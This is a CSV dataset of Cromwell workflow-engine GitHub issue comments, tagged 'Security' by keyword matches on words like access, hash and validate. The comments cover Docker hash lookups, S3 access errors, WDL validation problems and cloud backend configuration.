Security,"Hmm... is this a security flaw? Should people even be allowed to do this (or is this configurable?). Current thinking... it might be ok because if you are running a cromwell with a local docker engine you may very well want to do this. If you are running cromwell with local docker, and allowing someone to run jobs on your server, they could gain access to any file anyway via their jobs. . Thoughts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-217951965:17,secur,security,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-217951965,2,"['access', 'secur']","['access', 'security']"
Security,"Honestly I'd really like it if that validation were removed from wdl4s. Even though it ""makes sense"" for it to be there because ""the spec says memory should be formatted like this so we should validate it down at the wdl4s level"". I still would rather change the spec to be a suggestion rather than something that's mandatory so we don't have this one outlier which actually makes the code a lot harder to write. If we do change that now, I'll shed a tear because I have to rebase those changes on my super long lived branch that we were going to get to once PBE was finished.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212551388:36,validat,validation,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212551388,2,['validat'],"['validate', 'validation']"
Security,"How about if we just drop the structure and flattened all the messages:; ```; ""failures"": [{; ""message"": ""connect timed out""; ""message"": ""Failed to upload authentication file""; ""message"": ""Error getting access token for service account: ""; }]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2037#issuecomment-282801717:155,authenticat,authentication,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2037#issuecomment-282801717,2,"['access', 'authenticat']","['access', 'authentication']"
Security,How do I access the JIRA board? Getting an access denied?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6505:9,access,access,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6505,2,['access'],['access']
Security,How do I set docker hash with cache calls?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:20,hash,hash,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['hash'],['hash']
Security,"How would the validation know what backend the task is going to be run on and if that backend requires docker?. Which is not to say that it can't happen sooner, but I don't think it can work like you're picturing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2932#issuecomment-346460834:14,validat,validation,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2932#issuecomment-346460834,1,['validat'],['validation']
Security,"However it'd be lovely to have defense in depth in case they ever changed something :). Also, if we want to expose the API directly to the outside world (which is likely sooner than later)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958825:108,expose,expose,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958825,1,['expose'],['expose']
Security,I agree that metrics on checksum failures would be nice but that does seem to be beyond the scope of the ticket as currently written; perhaps a follow-on ticket?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6683#issuecomment-1051019488:24,checksum,checksum,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6683#issuecomment-1051019488,1,['checksum'],['checksum']
Security,"I agree, it looks like introducing `s3.amazonaws.com` before the bucket path breaks the path. What version of Cromwell are you on?; ```; > aws s3 ls ""s3://aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/""; 2019-04-23 15:41:46 0 ; 2019-04-23 15:46:35 2 local_disk-rc.txt; 2019-04-23 15:46:36 0 local_disk-stderr.log; 2019-04-23 15:46:35 1304 local_disk-stdout.log; 2019-04-23 15:41:46 1117 script; ```; ```; > aws s3 ls ""s3://s3.amazonaws.com/aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/"". An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied; ```; I think what the code is going for is [introducing an endpoint](https://docs.aws.amazon.com/general/latest/gr/s3.html) which is supported when using HTTP/REST but apparently not with the `s3://` scheme.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185:588,Access,AccessDenied,588,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185,2,['Access'],"['Access', 'AccessDenied']"
Security,"I also played around with bolting on the docker hashing too. To be clear, I like @mcovarr's PR here better, as it's much cleaner, and has tests! Still, here's some overlapping [code](https://github.com/broadinstitute/cromwell/compare/job_avoidance...ks_hash_docker_image) to look at, especially the first commit with an alternative way to get an `ActorSystem` down into the `BackendCall`. A few issues left though, but some/most of these can be logged as new tickets, and we can get basic wiring in for the moment via this PR. Biggest issue-- 10 seconds is right on the edge for testing _and_ checking the docker server for the hash, so different docker tests currently timeout intermittently. Among other issues I saw, `Future` exception handling may be different due to refactoring. For example converting `Future { /* big block */ }` to `/* big block */ hashFuture.map(hash => ...)` allows exceptions within the block to not get caught (as expected?). Also I wasn't sure yet how we want to handle some `Failure` cases, specifically when the docker server doesn't return a hash. I assume that means that we should just run again from scratch, and NOT go to a `FailedExecution` state in the database. Or maybe we should go to `Failure`, and just retry a particular operations later. With ~~Gatling~~ Tyburn load testing, perhaps we can log any docker client errors now, and start to distinguish them with custom error handling code as they pop up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702:48,hash,hashing,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702,10,['hash'],"['hash', 'hashFuture', 'hashing']"
Security,"I also tried Firefox Quantum 65.0.1, with all extensions disabled. (Also tried with the latest Shockwave Flash, just in case.) Same result. I also tried IE9 with basically no plug-ins, and I cannot even login there. The ""Sign In"" button does nothing. Are you sure that my account gives me access to ask questions?. Any other ideas?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4625#issuecomment-465215552:289,access,access,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4625#issuecomment-465215552,1,['access'],['access']
Security,"I am also having this issue. . I don't understand what I am going wrong because it seems to be I am following the basic use case explained in the cromwell manual. I have basicaly took the published paired-fastq-to-unmapped-bam.wdl. can have added inputs and parsing to that each umapped bam file created get processed first by ; processing-for-variant-discovery-local-gatk4.wdl; and then the processed bam file gets processed by ; haplotypecaller-gvcf-gatk4.wdl. So I import the 2 workflows on the top. ```; import ""processing-for-variant-discovery-local-gatk4.wdl"" as process_bam; import ""haplotypecaller-gvcf-gatk4_no_docker.wdl"" as haplotype_caller; ```. and then use them on the ubam outputs. When I run it through validate I get the same error. ```; java -jar ~/src/cromwell-36/womtool-36.jar validate my_pipeline.wdl. ERROR: Missing value or call: Couldn't find value or call with name 'haplotype_caller' in workflow (line 131):. Array[File] HaplotypeCalls_output_vcfs = haplotype_caller.HaplotypeCallerGvcf_GATK4.output_vcf; ^. java -jar ~/src/cromwell-36/womtool-36.jar validate my_pipeline.wdl. ERROR: Missing value or call: Couldn't find value or call with name 'haplotype_caller' in workflow (line 131):. Array[File] HaplotypeCalls_output_vcfs = haplotype_caller.output_vcf; ^; ```. I thought it might be that 2 subworkflows was not supported so I took out the last one and the error become about the first:. ```; java -jar ~/src/cromwell-36/womtool-36.jar validate my_pipeline_no_variant_calling.wdl. ERROR: Missing value or call: Couldn't find value or call with name 'sub' in workflow (line 110):. Array[File] ProcessedBams_duplication_metrics = sub.duplication_metrics; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2756#issuecomment-435006736:719,validat,validate,719,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2756#issuecomment-435006736,4,['validat'],['validate']
Security,I am curious ... how do I look into my Stackdriver Audit logs?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685289891:51,Audit,Audit,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685289891,1,['Audit'],['Audit']
Security,I am currently using Hashicorp Nomad for some other applications. I am interested in using Nomad to run Cromwell jobs.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6001#issuecomment-1079171605:21,Hash,Hashicorp,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6001#issuecomment-1079171605,1,['Hash'],['Hashicorp']
Security,"I am developing a pipeline and want to share google storage buckets for genome data (bowtie2 index tar ball and other big files) with users (Google authenticated) but want users to pay for the network traffic to download genome data. My pipeline works fine if storage bucket for genome data is set as ""owner pays"". But if I set it ""requester pays"" then I get the following error `BadRequestException: 400 Bucket is requester pays bucket but no user project provided`. I googled it and found that [`gsutil` must use JSON API (not CLI)](https://cloud.google.com/storage/docs/requester-pays) for ""requester pays"" buckets. Is there any plan to support ""requester pays"" buckets for JES backend? . ```; [2017-11-18 16:01:09,72] [info] JesAsyncBackendJobExecutionActor [d57a5f97atac.bowtie2:0:1]: python $(which encode_bowtie2.py) \; /cromwell_root/atac-seq-pipeline-genome-data/mm10/bowtie2_index/mm10_no_alt_analysis_set_ENCODE.fasta.tar \; /cromwell_root/atac-seq-pipeline-workflows/ENCSR889WQX/atac/d57a5f97-8542-4fcc-89c4-b7c487957dea/call-trim_adapter/shard-0/glob-019a547c7b0dda79121d0398158a07d0/ENCFF439VSY.trim.merged.R1.fastq.gz \; \; --multimapping 4 \; \; --nth 4; [2017-11-18 16:01:09,72] [info] JesAsyncBackendJobExecutionActor [d57a5f97atac.bowtie2:1:1]: python $(which encode_bowtie2.py) \; /cromwell_root/atac-seq-pipeline-genome-data/mm10/bowtie2_index/mm10_no_alt_analysis_set_ENCODE.fasta.tar \; /cromwell_root/atac-seq-pipeline-workflows/ENCSR889WQX/atac/d57a5f97-8542-4fcc-89c4-b7c487957dea/call-trim_adapter/shard-1/glob-019a547c7b0dda79121d0398158a07d0/ENCFF463QCX.trim.merged.R1.fastq.gz \; \; --multimapping 4 \; \; --nth 4; [2017-11-18 16:01:18,97] [info] JesAsyncBackendJobExecutionActor [d57a5f97atac.bowtie2:0:1]: job id: operations/EJSf0Yz9Kxjs8__E9aKWivQBILWN-vrbGyoPcHJvZHVjdGlvblF1ZXVl; [2017-11-18 16:01:18,97] [info] JesAsyncBackendJobExecutionActor [d57a5f97atac.bowtie2:1:1]: job id: operations/EJWg0Yz9KxiXpeC4gsSenC4gtY36-tsbKg9wcm9kdWN0aW9uUXVldWU; [2017-11-18 16:01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2916:148,authenticat,authenticated,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2916,1,['authenticat'],['authenticated']
Security,"I am encountering call caching issues with images from google artifact registry (gar). . When I use image directly from dockerhub or gcr I have no call caching issues and see this in the logs. > 2024-07-19 14:35:24 cromwell-system-akka.dispatchers.engine-dispatcher-26890 INFO - BT-322 61ba2acc:garTest.simpleLs:-1:1 cache hit copying nomatch: could not find a suitable cache hit.; 2024-07-19 14:35:24 cromwell-system-akka.dispatchers.engine-dispatcher-26890 INFO - 61ba2acc-4274-423b-818a-8cf1da67cd44-EngineJobExecutionActor-garTest.simpleLs:NA:1 [UUID(61ba2acc)]: Could not copy a suitable cache hit for 61ba2acc:garTest.simpleLs:-1:1. No copy attempts were made. However, when I copy the same image to my access controlled google artifact registry I get this authentication error. > 2024-07-19 14:31:44 cromwell-system-akka.dispatchers.engine-dispatcher-3006 WARN - BackendPreparationActor_for_f20da4b8:garTest.simpleLs:-1:1 [UUID(f20da4b8)]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for us-central1-docker.pkg.dev/xxx/yyy/aaa Request failed with status 403 and body {""errors"":[{""code"":""DENIED"",""message"":""Unauthenticated request. Unauthenticated requests do not have permission \""artifactregistry.repositories.downloadArtifacts\"" on resource \""projects/xxx/locations/us-central1/repositories/yyy\"" (or it may not exist)""}]}. The workflow completes successfully regardless of this error but call caching doesn't work when a gar image is used.; The service account I am using with the cromwell server has ""Artifact Registry Reader"" IAM role.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7473:709,access,access,709,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7473,3,"['access', 'authenticat', 'hash']","['access', 'authentication', 'hash']"
Security,"I am executing a CWL workflow with AWS batch backend. ; Each task is submitted by cromwell and I can verify on AWS console that all jobs ended successfully.; However, for jobs that I have set coresMin and coresMax requirements I get the warning:. ```; [warn] AwsBatchAsyncBackendJobExecutionActor [6bd79e09fastqc_1:NA:1]: Unrecognized runtime attribute keys: cpuMax; ```. and at the end of the workflow the error:; ```; [error] Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); 	at cromwel",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:1073,Validat,ValidatedRuntimeAttributesBuilder,1073,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['Validat'],['ValidatedRuntimeAttributesBuilder']
Security,"I am experiencing a similar issue. Due to private AWS ECR registries not being supported, the hash lookup would not work with the remote hash lookup which was causing call-caching to not work. To bypass this, I installed a Docker CLI on the Cromwell server and enabled the local lookup, but this library/ prefix kept being added. I was able to patch it by modifying `dockerHashing/src/main/scala/cromwell/docker/local/DockerCliFlow.scala`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450:94,hash,hash,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450,2,['hash'],['hash']
Security,"I am following up on a [report](https://gatkforums.broadinstitute.org/wdl/discussion/23250/wdl-1-0-wont-let-me-call-an-optional-task-with-an-optional-input) (by someone else) filed over a year ago.; Now I have a slightly different need, that is, the task 2 will take the optional input `input_2_opt` for its required input.; So, the following is what I want to achieve. ```; version 1.0. workflow my_workflow {; input {; File input_1; File? input_2_opt; }. call task1 {; input:; input_1 = input_1; }. if (defined(input_2_opt)) {; call task2 {; input:; input_2 = input_2_opt; }; }. output {; File output_1 = task1.output_1; File? output_2 = task2.output_2; }; }. task task1 {; input{; File input_1; }; command {; echo ""Hello, world!"" > hello.txt; }; output {; File output_1 = ""hello.txt""; }; }. task task2 {; input{; File input_2; }; command {; cat ${input_2} > goodbye.txt; }; output {; File output_2 = ""goodbye.txt""; }; }. ```. Running `womtool validate` on this gives. ```; Failed to process workflow definition 'my_workflow' (reason 1 of 1): Failed to process 'call task2' (reason 1 of 1): Failed to supply input input_2 = input_2_opt (reason 1 of 1): Cannot coerce expression of type 'File?' to 'File'; ```. But like in the original post, if I take out the version specification and the `input` braces in the workflow and tasks, womtool thinks the WDL is OK. Can you please explain what is the cause? And is there a solution on my end?. Thanks. ----------------------; ### The Jira interface is way too overwhelming ; ###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5354:946,validat,validate,946,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5354,1,['validat'],['validate']
Security,"I am having the same error with the example ""Using Data on S3"" on https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-examples/ . I have changed the S3 bucket name in the .json file to my bucket name, but the run still failed. After reporting running failure, I have got the same error message. I am using cromwell-48. The S3 bucket has all public access, and I was logged in as the Admin in two terminal windows, one running the server and the other submitting the job. The previous two hello-world example were successful. There is no log file in the bucket and in the cromwell-execution, the only file create was the script. There is no rc or stderr or stdout created.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-597868610:373,access,access,373,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-597868610,1,['access'],['access']
Security,"I am looking to switch over from the Google Life Sciences API to Batch backend, as I recently saw that the service will be deprecated. When I look at the stable documentation, I see documentation for PAPIv2 and I can only access GCPBatch documentation on the development docs. https://cromwell.readthedocs.io/en/develop/backends/GCPBatch/. I have tried to run a few test workflows using GCPBATCH backend with cromwell-85 release. Before I get too far, I wanted to inquire to see if there is full support for GCPBATCH or if this is something that will be supported in the future and we should keep using PAPIv2 for the time being?. In the cromwell.examples.conf listed providers I also do not see GCPBATCH https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/cromwell.examples.conf#L324C3-L341C30. While there is an example for this backend:; https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/GCPBATCH.conf. Thanks!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7215:222,access,access,222,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7215,1,['access'],['access']
Security,"I am running into the same bug on Terra. Not sure what version of Cromwell it is using. My wdl validates however, I get the a run time error. ```; Failed to evaluate input 'fastq1' (reason 1 of 1): No coercion defined from wom value(s) '""gs://fc-secure-46b3886a-473a-49ef-8073-022230a526ac/6463b025-27cf-4649-b6d0-59f860bdf18b/bam2FastQStarAlignWorkflow/a4a0d2f2-cc8b-41d8-a5b5-61cf6c2d0bd4/call-bamToFastq/cacheCopy/GTEX-1192X-0011-R10a-SM-DO941.1.fastq.gz""' of type 'File' to 'Array[File]'.; ```. adding '[' and ']' resolved the run time issue; ```; call starWorkflow.star_fastq_list {; input:; star_index = starIndex,; fastq1 = [ bamToFastq.firstEndFastq ],; fastq2 = [ bamToFastq.secondEndFastq ],; prefix = sampleId; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-1148945607:95,validat,validates,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-1148945607,2,"['secur', 'validat']","['secure-', 'validates']"
Security,"I am testing the cromwell workflow on NAVER Cloud Platform (NCP). I tried setting using custom configuration of your documentation in github (https://github.com/broadinstitute/cromwell/tree/develop/cromwell.example.backends), but I failed. I would like to set configuration of backend including docker container and object storage (comparable with AWS S3) to the same level as AWS or GCP configuration in cromwell documentation. How can I do this?. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6548:1331,PASSWORD,PASSWORDS,1331,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6548,1,['PASSWORD'],['PASSWORDS']
Security,"I am trying to disable task-level call caching by using the Volatile optimization: (https://cromwell.readthedocs.io/en/stable/optimizations/VolatileTasks/#the-volatile-optimization). Since the documentation is written for Version 1.0, and I am using draft-2, I have the parameter as a string, as opposed to a boolean, as follows:. ```; meta {; volatile: ""true""; }; ```. However, while the WDL validates successfully, after running I can see that the task is still copying from the cache as opposed to no call-caching. . Does volatile keyword not work when using draft-2, or am I not using this correctly? . I am running Cromwell v52. Please let me know if there is any information I can include that would be useful.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6808:393,validat,validates,393,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6808,1,['validat'],['validates']
Security,"I am trying to disable task-level call-caching using the volatile optimization (https://cromwell.readthedocs.io/en/stable/optimizations/VolatileTasks/#backend-support), but since the documentation is written for version 1.0 and I am using draft-2, I have the ""true"" as a string as opposed to a boolean as follows:. ```; meta {; volatile: ""true""; } ; ```; More info on boolean vs string in this issue (https://github.com/broadinstitute/cromwell/issues/5476). However, I find that despite having the volatile option in my task, and the WDL successfully validating via womtools, call-caching is still enabled for the task. Is the volatile optimization only allowable on version 1.0 or am I not including it correctly in my task?. I am on Cromwell v52. Please let me know if any other information would be useful.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6811:551,validat,validating,551,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6811,1,['validat'],['validating']
Security,"I am trying to run Cromwell with docker images that were loaded with `docker load`. This means that the digests are unavailable (i.e. `<none>`). Unforutnately, this means that when looking up the image locally (i.e. when the config `docker.hash-lookup.method=""local""` is used), the image is not found. The offending lines of code are:; https://github.com/broadinstitute/cromwell/blob/1898d8103a06d160dc721d464862313e78ee7a2c/dockerHashing/src/main/scala/cromwell/docker/local/DockerCliClient.scala#L26; https://github.com/broadinstitute/cromwell/blob/1898d8103a06d160dc721d464862313e78ee7a2c/dockerHashing/src/main/scala/cromwell/docker/local/DockerCliClient.scala#L78-L92. Can we instead use the image ID instead of the digest when using local images?. <details>. <summary>log output</summary>. ```; [INFO] [09/16/2019 11:07:14.821] [cromwell-system-akka.dispatchers.engine-dispatcher-40] [akka://cromwell-system/user/SingleWorkflowRunnerActor/JobExecutionTokenDispenser] Not triggering log of token queue status. Effective log interval = None; [INFO] [09/16/2019 11:07:14.830] [cromwell-system-akka.dispatchers.engine-dispatcher-76] [akka://cromwell-system/user/SingleWorkflowRunnerActor/JobExecutionTokenDispenser] Assigned new job execution tokens to the following groups: 2b766fe6: 1; [2019-09-16 11:07:16,20] [error] Docker pull failed; java.lang.RuntimeException: Error running: docker pull <image>; Exit code: 1; Error response from daemon: pull access denied for <image> repository does not exist or may require 'docker login': denied: requested access to the resource is denied. 	at cromwell.docker.local.DockerCliClient.$anonfun$forRun$1(DockerCliClient.scala:58); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.docker.local.DockerCliClient.forRun(DockerCliClient.scala:50); 	at cromwell.docker.local.DockerCliClient.pull(DockerCliClient.scala:37); 	at cromwell.docker.local.DockerCliClient.pull$(DockerCliClient.scala:36); 	at cromwell.docker.local.DockerCliClient$.pull(DockerCliC",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178:240,hash,hash-lookup,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178,1,['hash'],['hash-lookup']
Security,"I am trying to test my wdl and docker image on my local computer before publishing. ```; [2022-02-09 11:16:10,66] [warn] BackendPreparationActor_for_35c8738b:deseq_one_vs_all.one_vs_all:-1:1 [35c8738b]: Docker lookup failed; java.lang.Exception: Unauthorized to get docker hash aedavids/test-1vs-all-2:latest; at cromwell.engine.workflow.WorkflowDockerLookupActor.cromwell$engine$workflow$WorkflowDockerLookupActor$$handleLookupFailure(WorkflowDockerLookupActor.scala:222); ```. using docker image I see that my image exists. I am able to start the container using docker run. I also tried using the sha instead of the tag name. same error. I run Cromwell as follows; ```; $ java -jar ${WDL_TOOLS}/cromwell-74.jar run --inputs ../1vsAllTask.wdl.inputs.json ../1vsAllTask.wdl; ```. ```; $ cat ../1vsAllTask.wdl.inputs.json ; {; stuff deleted; ""deseq_one_vs_all.one_vs_all.dockerImg"": ""aedavids/test-1vs-all-2""; }; ```. ```; $ docker images |grep aedavids; aedavids/test-1vs-all-2 latest 0d33407a54e3 19 hours ago 6.28GB; ```; Any idea what my issue might be?. Andy. fyi https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team is a bad URL. I not have access to Jira on broadworkbench.atlassian.net.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6674:273,hash,hash,273,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6674,2,"['access', 'hash']","['access', 'hash']"
Security,I assume it would be nice to have the hash of the Docker image Cromwell thinks your call ran with (pretending there are no race condition or other consistency issues between what Cromwell is doing to validate hashes and what's seen in JES)?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164547063:38,hash,hash,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164547063,3,"['hash', 'validat']","['hash', 'hashes', 'validate']"
Security,"I beleive that I have worked out the reason for this.; I'm using the ""path"" hashing strategy, and at out org there is an ongoing data move that is leaving symlinks behind, so all my paths in my reference file are still correct, but the real path has changed. Changing the hashing strategy to file has worked in at least one test case, and I'm trying a larger test now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5370#issuecomment-575730947:76,hash,hashing,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5370#issuecomment-575730947,2,['hash'],['hashing']
Security,"I believe it does now cover it since you can see the difference in hash per input and trace that back to a change in the contents of a file (however you might not be able to tell difference between different file path to same input vs same file path with different file contents, but you can tell it's a different file path from the inputs that were used, so I believe you have enough info to make this call). Unless @helgridly can think of something this isn't covering",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-332236660:67,hash,hash,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-332236660,1,['hash'],['hash']
Security,"I believe that in Life Sciences and its predecessors, pull access to private GCR images was granted by the credentials on the job VM. Since Batch is a much larger step change, it could be that this behavior no longer holds true. @Lipastomies what steps do you take to configure your system to use those private images?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2130262417:59,access,access,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2130262417,1,['access'],['access']
Security,I believe the related google doc is [Slick Heartburn](https://docs.google.com/document/d/11CHJzI-rQJWJ2XZWjPo1WUr8CiqCYn_vv_a5Raprw9U/edit).; @geoffjentry have we chosen a plan of attack yet?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-332211258:180,attack,attack,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-332211258,1,['attack'],['attack']
Security,"I believe this was only used for hashes, which are no longer part of Cromwells v21+",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1251#issuecomment-253931720:33,hash,hashes,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1251#issuecomment-253931720,1,['hash'],['hashes']
Security,"I believe to do this properly, it's the specific backend that should grab the docker image hash when a task is actually run (as opposed to the engine which can evaluate it when it sends it to the backend... which could queue it for any length of time). When checking for a call cache hit... we should first check everything else that's cheap before getting this hash",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-259272505:91,hash,hash,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-259272505,2,['hash'],['hash']
